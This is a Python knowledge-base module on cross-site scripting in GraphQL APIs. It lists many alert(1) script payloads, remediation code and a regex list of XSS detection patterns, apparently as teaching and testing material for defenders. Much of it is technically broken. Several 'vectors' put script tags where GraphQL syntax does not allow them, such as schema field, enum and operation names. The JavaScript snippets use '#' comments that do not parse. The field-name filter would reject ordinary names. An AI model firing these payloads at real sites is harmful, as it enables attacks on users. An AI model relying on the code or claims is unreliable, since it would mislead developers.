#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easyprotech)
Dev: Brabus
Date: Sat 25 Oct 2025 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: GraphQL XSS Context - Comprehensive Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in GraphQL Context",

    # Metadata for SIEM/Triage Integration
    "severity": "high",
    "cvss_score": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "graphql", "api-injection", "query-manipulation", "modern-web"],

    "description": """
GraphQL XSS occurs when user input is reflected into GraphQL queries, mutations, or responses
without proper sanitization. GraphQL is a query language for APIs that provides flexible data
fetching capabilities. When malicious content is injected into GraphQL operations or when
query results are displayed without sanitization, it can lead to XSS attacks through API responses.

VULNERABILITY CONTEXT:
GraphQL XSS typically happens when:
1. Query parameters contain malicious content
2. Mutation inputs are reflected in responses
3. Introspection queries return dangerous data
4. Subscription updates contain user-controlled content
5. Error messages leak sensitive information
6. Field aliases contain executable content

Common in:
- GraphQL API implementations
- React/Apollo applications
- API gateways
- Headless CMS systems
- E-commerce platforms
- Social media APIs
- Mobile applications with GraphQL

SEVERITY: HIGH
GraphQL XSS can affect multiple clients consuming the same API and can lead to persistent attacks
through cached responses and subscriptions. The flexible nature of GraphQL makes comprehensive
sanitization challenging.
""",

    "attack_vector": """
GRAPHQL XSS ATTACK VECTORS:

1. QUERY PARAMETER INJECTION:
   GraphQL query with user input:
   query GetUser($id: ID!) {
     user(id: $id) {
       name
       bio
     }
   }

   Variables:
   {"id": "USER_INPUT"}  # ID injection

   If ID is reflected in response:
   {"data": {"user": {"name": "<script>alert(1)</script>", "bio": "Bio"}}}

2. FIELD ALIAS INJECTION:
   Query with alias injection:
   query {
     user_<script>alert(1)</script>: user(id: "123") {
       name
     }
   }

   Result may execute script in some parsers

3. MUTATION INPUT INJECTION:
   Mutation with user content:
   mutation UpdateProfile($input: UpdateProfileInput!) {
     updateProfile(input: $input) {
       profile {
         displayName
         status
       }
     }
   }

   Variables:
   {
     "input": {
       "displayName": "<script>alert(1)</script>",  # Display name XSS
       "status": "Active"
     }
   }

4. SUBSCRIPTION INJECTION:
   Real-time subscription with XSS:
   subscription OnUserUpdate {
     userUpdate {
       message
       content  # User-controlled content
     }
   }

   Subscription data:
   {
     "data": {
       "userUpdate": {
         "message": "Update",
         "content": "<script>alert(1)</script>"# Subscription XSS
       }
     }
   }

5. ERROR MESSAGE INJECTION:
   Malformed query leading to XSS:
   query {
     user(id: "<script>alert(1)</script>") {# Invalid ID with XSS
       name
     }
   }

   Error response:
   {"errors": [{"message": "Invalid user ID: <script>alert(1)</script>"}]}

ADVANCED GRAPHQL XSS TECHNIQUES:

6. INTROSPECTION QUERY INJECTION:
   Introspection with XSS:
   query IntrospectionQuery {
     __schema {
       queryType {
         name
         description# Description might be user-controlled
       }
     }
   }

7. FRAGMENT INJECTION:
   Fragment with malicious content:
   query {
     user(id: "123") {
       ...UserFields
     }
   }

   fragment UserFields on User {
     name
     bio_<script>alert(1)</script>: bio# Fragment alias XSS
   }

8. DIRECTIVE INJECTION:
   Directives with XSS:
   query {
     user(id: "123") @include(if: USER_INPUT) {# Directive injection
       name
     }
   }

   Attack payload:
   true) { name } <script>alert(1)</script> #

9. VARIABLE INJECTION:
   Complex variable injection:
   query GetUsers($filter: String!) {
     users(filter: $filter) {
       name
       profile {
         bio
       }
     }
   }

   Variables:
   {"filter": "name:<script>alert(1)</script>"}# Filter XSS

10. BATCH QUERY INJECTION:
    Batch queries with XSS:
    [
      {"query": "query { user(id: \\"<script>alert(1)</script>\\") { name } }"},
      {"query": "query { settings { theme } }"}
    ]

11. SCHEMA FIELD INJECTION:
    Schema with malicious field names:
    type User {
      name: String
      <script>alert(1)</script>: String# Field name XSS
    }

12. ENUM VALUE INJECTION:
    Enum with XSS values:
    enum UserStatus {
      ACTIVE
      INACTIVE
      <script>alert(1)</script># Enum value XSS
    }

13. UNION TYPE INJECTION:
    Union types with XSS:
    union SearchResult = User | Post | <script>alert(1)</script># Union XSS

14. INTERFACE INJECTION:
    Interface with malicious fields:
    interface Node {
      id: ID!
      <script>alert(1)</script>: String# Interface field XSS
    }

15. SCALAR TYPE INJECTION:
    Custom scalar with XSS:
    scalar JSON
    scalar <script>alert(1)</script># Scalar name XSS

GRAPHQL-SPECIFIC BYPASSES:

16. QUERY DEPTH INJECTION:
    Deep query with XSS:
    query {
      user(id: "123") {
        profile {
          settings {
            theme {
              name
              <script>alert(1)</script>: value# Deep field XSS
            }
          }
        }
      }
    }

17. OPERATION NAME INJECTION:
    Operation name with XSS:
    query <script>alert(1)</script> {# Operation name XSS
      user(id: "123") {
        name
      }
    }

18. COMMENT INJECTION:
    GraphQL comments with XSS:
    query {
      # <script>alert(1)</script># Comment XSS
      user(id: "123") {
        name
      }
    }

19. STRING ESCAPE BYPASS:
    Escaped strings with XSS:
    {"id": "\\"<script>alert(1)</script>\\""}# Escaped XSS

20. BLOCK STRING INJECTION:
    Block strings with XSS:
    query {
      user(id: "123") {
        bio(description: \"\"\"
          <script>alert(1)</script>  # Block string XSS
        \"\"\")
      }
    }

REAL-WORLD ATTACK SCENARIOS:

21. SOCIAL MEDIA API:
    - GraphQL API for posts
    - Post content: <script>alert(1)</script>
    - Displayed in feed
    - Feed-based XSS attacks

22. E-COMMERCE PLATFORM:
    - Product search API
    - Product name: <script>alert(1)</script>
    - Search results XSS
    - Shopping cart manipulation

23. USER PROFILE SYSTEM:
    - Profile update mutation
    - Display name: <script>alert(1)</script>
    - Profile display XSS
    - Profile-based attacks

24. CHAT APPLICATION:
    - Real-time messaging API
    - Message subscription: <script>alert(1)</script>
    - Real-time XSS via subscriptions
    - Chat hijacking

25. COLLABORATION PLATFORM:
    - Document sharing API
    - Document title: <script>alert(1)</script>
    - Document display XSS
    - Collaboration hijacking

26. ANALYTICS DASHBOARD:
    - Metrics API
    - Metric name: <script>alert(1)</script>
    - Dashboard XSS
    - Analytics manipulation

27. MOBILE APPLICATION:
    - GraphQL backend
    - Mobile app consuming API
    - API response: <script>alert(1)</script>
    - Mobile app XSS

GRAPHQL XSS DETECTION:

28. MANUAL TESTING:
    - GraphQL playground testing
    - Query introspection analysis
    - Mutation testing
    - Subscription monitoring

29. AUTOMATED SCANNING:
    - GraphQL schema analysis
    - Query injection testing
    - Response sanitization validation
    - Subscription security testing

30. PROXY MONITORING:
    - GraphQL traffic interception
    - Query/response analysis
    - Schema validation
    - Error message inspection
""",

    "remediation": """
GRAPHQL XSS DEFENSE STRATEGY:

1. INPUT VALIDATION (PRIMARY DEFENSE):
   Validate all GraphQL inputs:

   function validateGraphQLInput(input, schema) {
   # Type validation
     if (!isValidType(input, schema.type)) {
       throw new Error('Invalid input type');
     }

   # Length limits
     if (typeof input === 'string' && input.length > MAX_STRING_LENGTH) {
       throw new Error('Input too long');
     }

   # Pattern validation
     if (schema.pattern && !schema.pattern.test(input)) {
       throw new Error('Invalid input format');
     }

     return input;
   }

2. OUTPUT SANITIZATION:
   Sanitize all GraphQL outputs:

   function sanitizeGraphQLOutput(data) {
     if (typeof data === 'string') {
       return DOMPurify.sanitize(data, {
         ALLOWED_TAGS: [],
         ALLOWED_ATTR: []
       });
     }

     if (Array.isArray(data)) {
       return data.map(sanitizeGraphQLOutput);
     }

     if (typeof data === 'object' && data !== null) {
       const sanitized = {};
       for (const [key, value] of Object.entries(data)) {
         sanitized[key] = sanitizeGraphQLOutput(value);
       }
       return sanitized;
     }

     return data;
   }

3. QUERY DEPTH LIMITATION:
   Limit GraphQL query depth:

   const MAX_DEPTH = 10;

   function validateQueryDepth(query, depth = 0) {
     if (depth > MAX_DEPTH) {
       throw new Error('Query too deep');
     }

   # Recursively validate nested fields
     for (const field of query.selectionSet.selections) {
       if (field.selectionSet) {
         validateQueryDepth(field, depth + 1);
       }
     }
   }

4. FIELD NAME VALIDATION:
   Validate field names:

   function isValidFieldName(name) {
   # Must start with letter or underscore
     if (!/^[a-zA-Z_]/.test(name)) return false;

   # Must contain only alphanumeric and underscores
     if (!/^[a-zA-Z0-9_]+$/.test(name)) return false;

   # Must not contain XSS patterns
     const dangerousPatterns = [
       /script/i,
       /javascript/i,
       /on\w+/i,
       /<[^>]*>/i
     ];

     for (const pattern of dangerousPatterns) {
       if (pattern.test(name)) return false;
     }

     return true;
   }

5. MUTATION INPUT SANITIZATION:
   Sanitize mutation inputs:

   function sanitizeMutationInput(input, schema) {
     const sanitized = {};

     for (const [field, value] of Object.entries(input)) {
     # Validate field name
       if (!isValidFieldName(field)) {
         throw new Error('Invalid field name: ' + field);
       }

     # Sanitize field value
       sanitized[field] = sanitizeGraphQLOutput(value);
     }

     return sanitized;
   }

6. SUBSCRIPTION SECURITY:
   Secure GraphQL subscriptions:

   function validateSubscriptionData(data) {
   # Validate subscription payload
     if (!isValidSubscriptionPayload(data)) {
       throw new Error('Invalid subscription data');
     }

   # Sanitize subscription content
     return sanitizeGraphQLOutput(data);
   }

7. ERROR MESSAGE SECURITY:
   Secure error handling:

   function handleGraphQLError(error) {
     logger.error('GraphQL error', {
       message: error.message,
       path: error.path,
       code: error.code
     });

   # Return generic error messages
     return {
       errors: [{
         message: 'An error occurred',
         extensions: {
           code: 'INTERNAL_ERROR'
         }
       }]
     };
   }

8. INTROSPECTION PROTECTION:
   Control GraphQL introspection:

   const introspectionRules = {
     disableIntrospection: process.env.NODE_ENV === 'production',
     allowedIntrospectionFields: ['__typename', '__schema'],
     blockFieldSuggestion: true
   };

9. RATE LIMITING:
   Implement GraphQL rate limiting:

   const rateLimiter = new RateLimiter({
     windowMs: 15 * 60 * 1000,# 15 minutes
     max: 100,# limit each IP to 100 requests per windowMs
     message: 'Too many GraphQL requests'
   });

10. SCHEMA VALIDATION:
    Validate GraphQL schema:

    function validateSchema(schema) {
    # Check for dangerous field names
      for (const type of Object.values(schema.getTypeMap())) {
        if (type.name && !isValidFieldName(type.name)) {
          throw new Error('Invalid type name: ' + type.name);
        }

        if (type.getFields) {
          for (const [fieldName, field] of Object.entries(type.getFields())) {
            if (!isValidFieldName(fieldName)) {
              throw new Error('Invalid field name: ' + fieldName);
            }
          }
        }
      }
    }

11. QUERY COMPLEXITY ANALYSIS:
    Analyze query complexity:

    function analyzeQueryComplexity(query) {
      let complexity = 0;

    # Count selections
      function countSelections(selectionSet) {
        for (const selection of selectionSet.selections) {
          complexity++;

          if (selection.selectionSet) {
            countSelections(selection.selectionSet);
          }
        }
      }

      countSelections(query.selectionSet);

      if (complexity > MAX_COMPLEXITY) {
        throw new Error('Query too complex');
      }

      return complexity;
    }

12. CSP FOR GRAPHQL:
    Content Security Policy:

    Content-Security-Policy:
      default-src 'self';
      script-src 'self' 'nonce-{random}';
      connect-src 'self' https://api.graphql.org;
      object-src 'none';

13. AUTHENTICATION AND AUTHORIZATION:
    Secure GraphQL operations:

    function authenticateGraphQLRequest(context) {
      const token = context.headers.authorization;

      if (!token) {
        throw new GraphQLError('Authentication required');
      }

      try {
        const user = verifyToken(token);
        context.user = user;
        return user;
      } catch (error) {
        throw new GraphQLError('Invalid token');
      }
    }

14. LOGGING AND MONITORING:
    Comprehensive GraphQL monitoring:

    function logGraphQLOperation(operation, context) {
      logger.info('GraphQL operation', {
        operationName: operation.name?.value,
        operationType: operation.operation,
        complexity: analyzeQueryComplexity(operation),
        userId: context.user?.id,
        timestamp: new Date().toISOString()
      });
    }

15. TESTING AND VALIDATION:
    Regular security testing:

    Automated tests:
    - GraphQL input validation
    - Output sanitization testing
    - Query complexity analysis
    - Subscription security testing

    Manual tests:
    - GraphQL playground testing
    - Schema introspection analysis
    - Error message validation

SECURITY TESTING PAYLOADS:

Basic GraphQL XSS:
{"id": "<script>alert(1)</script>"}
{"displayName": "<script>alert(1)</script>"}
{"content": "<script>alert(1)</script>"}

Query injection:
query { user(id: "<script>alert(1)</script>") { name } }
mutation { updateProfile(input: { name: "<script>alert(1)</script>" }) { success } }

Alias injection:
query { <script>alert(1)</script>: user(id: "123") { name } }
fragment <script>alert(1)</script> on User { name }

Advanced payloads:
query { user(id: "123") { ...XSSFragment } } fragment XSSFragment on User { name bio: "<script>alert(1)</script>" }
subscription { userUpdate { message: "<script>alert(1)</script>" } }

GRAPHQL SECURITY HEADERS:

Content-Type: application/graphql
X-GraphQL-Operation: query
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff

MONITORING METRICS:

Monitor for:
- Unusual query patterns
- High query complexity
- Error message anomalies
- Subscription abuse
- Rate limiting violations

OWASP REFERENCES:
- OWASP GraphQL Cheat Sheet
- OWASP API Security Top 10
- GraphQL Security Best Practices
- API Security Testing Guide
"""
}
